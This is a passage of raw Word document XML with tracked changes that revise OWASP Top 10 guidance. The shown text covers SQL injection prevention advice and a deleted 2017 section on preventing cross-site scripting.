      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Even when parameterized, stored procedures can still introduce</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E957422" w14:textId="0DD1DE1A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1227" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1228" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL injection if PL/SQL or T-SQL concatenates queries and data</w:t>
      </w:r>
      <w:del w:id="1229" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56951511" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1230" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> executes hostile data with EXECUTE IMMEDIATE or </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exec(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3056096A" w14:textId="47424A3C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1231" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1232" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6FB3F1FC" w14:textId="5526C1E1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1233" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1234" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use positive </w:t>
      </w:r>
      <w:del w:id="1235" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">or "whitelist" </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>server-side input validation. This is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65573F84" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1236" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1237" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> not a complete defense as many applications </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> special</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2C853D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1238" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> characters, such as text areas or APIs for mobile applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0070A4" w14:textId="4AE8A5A9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1239" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1240" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0DEE2A9C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1241" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1242" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> For any residual dynamic queries, escape special characters using</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E54CC9" w14:textId="5A2824D3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1243" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1244" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the specific escape syntax for that interpreter</w:t>
      </w:r>
      <w:del w:id="1245" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1246" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.&lt;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>br</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6BBF71A4" w14:textId="609EFC5C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1247" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1248" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> **Note</w:t>
      </w:r>
      <w:del w:id="1249" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1250" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL </w:t>
      </w:r>
      <w:del w:id="1251" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>structure</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1252" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>structures</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> such as table names, column names, and so on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A778A61" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1253" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1254" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cannot be escaped, and thus user-supplied structure names are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470470FF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1255" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dangerous. This is a common issue in report-writing software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106FC49A" w14:textId="4E44449D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1256" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1257" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2AD5F2E1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1258" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1259" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use LIMIT and other SQL controls within queries to prevent mass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD37EA6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1260" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> disclosure of records in case of SQL injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C092A28" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1261" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="669CC9B2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1262" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1263" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="1264" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923159"/>
    </w:p>
    <w:p w14:paraId="2196463E" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1265" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1266" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1264"/>
      <w:del w:id="1267" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To Prevent</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1D116BB4" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1268" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="405D8E30" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1269" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1270" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6024B14F" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1271" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB316C9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1272" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1273" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="437E1D39" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1274" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1275" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5833E574" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1276" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1277" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="59F6737F" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1278" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
